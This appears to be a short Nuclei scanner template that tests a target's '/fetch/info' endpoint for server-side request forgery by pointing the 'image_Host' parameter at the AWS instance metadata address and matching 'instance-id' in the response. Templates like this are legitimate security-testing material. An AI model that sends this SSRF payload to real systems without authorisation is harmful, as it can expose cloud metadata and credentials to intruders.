id: ssrf-aws
info:
  name: ssrfaws
  author: kauenavarro
  severity: medium
  tags: ssrf
  reference: |
    - https://notifybugme.medium.com/how-github-recon-help-me-to-find-nine-full-ssrf-vulnerability-with-aws-metadata-access-531d931413a5

requests:
  - method: GET
    path:
      - '{{BaseURL}}/fetch/info?inquiry=&image_Host=http://169.254.169.254/latest/meta-data/'
    matchers:
      - type: word
        words:
          - "instance-id"
        part: body
